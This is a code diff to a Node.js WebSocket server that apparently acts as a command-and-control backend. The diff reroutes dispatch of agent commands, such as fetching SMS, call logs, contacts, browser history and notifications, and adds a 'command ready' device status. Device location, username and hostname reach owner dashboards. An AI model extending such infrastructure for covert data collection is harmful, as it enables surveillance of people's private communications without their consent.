@@ -26,6 +26,7 @@ const {
 } = require('./historyHandler');
 const { userOwnsDevice, verifyAgentToken } = require('../services/authService');
 const { overlayDeviceStatus, looksAndroidDevice, recordAndroidBeat } = require('../services/androidBeat');
+const { isCommandReady } = require('./dispatchAgent');
 const { logMsg, msgText, Z } = require('../utils/messages');
 const {
     extractOwnerUserId,
@@ -142,6 +143,10 @@ function getLiveDeviceOptions(userId = null, opts = {}) {
             if (socket?.readyState !== 1) return false;
             const auth = socket?.authContext;
             if (!auth || auth.kind !== 'agent') return false;
+            const deviceId = String(key.replace(/^AGENT_/, '').replace(/^DEVICE_/, ''));
+            if (socket._placeholder === true) {
+                return isCommandReady(deviceId, activeConnections);
+            }
             if (seeAll) return true;
             const owner = String(auth.userId || '').trim();
             if (!owner) return false; // unowned agent never shown to normal users
@@ -174,7 +179,7 @@ async function getDeviceOptions(userId = null, opts = {}) {
         const liveIds = new Set(getLiveDeviceOptions(userId, { seeAll }).map((d) => d.value));
         return cached.devices.map((d) => {
             const live = liveIds.has(d.value);
-            const status = overlayDeviceStatus(d.value, d.platform, d.lastAndroidBeatAt, live);
+            const status = overlayDeviceStatus(d.value, d.platform, d.lastAndroidBeatAt, live, activeConnections);
             return {
                 ...d,
                 status,
@@ -199,8 +204,8 @@ async function getDeviceOptions(userId = null, opts = {}) {
         return {
             value: deviceId,
             label: device.hostname || deviceId,
-            role: overlayDeviceStatus(deviceId, device.platform, device.lastAndroidBeatAt, isLive) === 'online' ? 'AGENT' : 'DEVICE',
-            status: overlayDeviceStatus(deviceId, device.platform, device.lastAndroidBeatAt, isLive),
+            role: overlayDeviceStatus(deviceId, device.platform, device.lastAndroidBeatAt, isLive, activeConnections) === 'online' ? 'AGENT' : 'DEVICE',
+            status: overlayDeviceStatus(deviceId, device.platform, device.lastAndroidBeatAt, isLive, activeConnections),
             platform: device.platform && device.platform !== 'unknown' ? device.platform : '',
             localIp: device.localIp || '',
             publicIp: device.publicIp || '',
@@ -999,40 +1004,23 @@ async function handleSocketMessage(ws, message) {
                 }));
                 return;
             }
-
-            // Prefer Raw TCP control plane when agent is connected there.
-            try {
-                const { sendCommandToAgent } = require('../control/controlHandler');
-                const action = String(packet.action || '');
-                const lightActions = new Set([
-                    'FETCH_BROWSER_HISTORY',
-                    'FETCH_BROWSER_HISTORY_DELTA',
-                    'FETCH_APP_HISTORY',
-                    'FETCH_SYSTEM_NOTIFICATIONS',
-                    'FETCH_CALL_LOGS',
-                    'FETCH_SMS_MESSAGES',
-                    'FETCH_CONTACTS',
-                    'STOP_HISTORY_COLLECTION',
-                ]);
-                if (lightActions.has(action) && sendCommandToAgent(packet.targetDeviceId, action, packet.payload || {})) {
-                    ws.send(JSON.stringify({ type: 'sys_ack', status: 'dispatched', transport: 'tcp', action }));
-                    return;
-                }
-            } catch (_) {}
         }
 
         if (packet.type === 'dispatch_control' && isHistoryCommand(packet.action)) {
-            const agentKey = `AGENT_${packet.targetDeviceId}`;
-            const deviceKey = `DEVICE_${packet.targetDeviceId}`;
-            const targetDeviceSocket = activeConnections.get(agentKey) || activeConnections.get(deviceKey);
-
-            if (targetDeviceSocket && targetDeviceSocket.readyState === 1) {
-                targetDeviceSocket.send(JSON.stringify({
+            const { dispatchAgentCommand } = require('./dispatchAgent');
+            const routed = dispatchAgentCommand(
+                packet.targetDeviceId,
+                packet.action,
+                packet.payload || {},
+                activeConnections
+            );
+            if (routed.ok) {
+                ws.send(JSON.stringify({
+                    type: 'sys_ack',
+                    status: 'dispatched',
                     action: packet.action,
-                    payload: packet.payload || {},
-                    timestamp: new Date()
+                    transport: routed.transport,
                 }));
-                ws.send(JSON.stringify({ type: 'sys_ack', status: 'dispatched', action: packet.action }));
             } else {
                 ws.send(JSON.stringify({ type: 'sys_error', message: 'Target system offline on WAN node connection pool.' }));
             }
@@ -1069,17 +1057,15 @@ async function handleSocketMessage(ws, message) {
         }
 
         if (packet.type === 'dispatch_control') {
-            const agentKey = `AGENT_${packet.targetDeviceId}`;
-            const deviceKey = `DEVICE_${packet.targetDeviceId}`;
-            const targetDeviceSocket = activeConnections.get(agentKey) || activeConnections.get(deviceKey);
-
-            if (targetDeviceSocket && targetDeviceSocket.readyState === 1) {
-                targetDeviceSocket.send(JSON.stringify({
-                    action: packet.action,
-                    payload: packet.payload,
-                    timestamp: new Date()
-                }));
-                ws.send(JSON.stringify({ type: 'sys_ack', status: 'dispatched' }));
+            const { dispatchAgentCommand } = require('./dispatchAgent');
+            const routed = dispatchAgentCommand(
+                packet.targetDeviceId,
+                packet.action,
+                packet.payload || {},
+                activeConnections
+            );
+            if (routed.ok) {
+                ws.send(JSON.stringify({ type: 'sys_ack', status: 'dispatched', transport: routed.transport }));
             } else {
                 ws.send(JSON.stringify({ type: 'sys_error', message: 'Target system offline on WAN node connection pool.' }));
             }
@@ -1147,7 +1133,10 @@ function handleDeviceStatusUpdate(ws, packet, activeConnections) {
 
     sendToOwnerDashboards(activeConnections, ownerUserId, {
         type: 'device_status_update',
-        deviceId, status, platform, localIp, publicIp, battery, storage, network,
+        deviceId,
+        status: isCommandReady(deviceId, activeConnections) ? status : 'away',
+        commandReady: isCommandReady(deviceId, activeConnections),
+        platform, localIp, publicIp, battery, storage, network,
         latitude, longitude, country, region, city, isp, timezone,
         hostname, username, osVersion, architecture, cpu, ram,
         lastSeen: lastSeen.toISOString(),
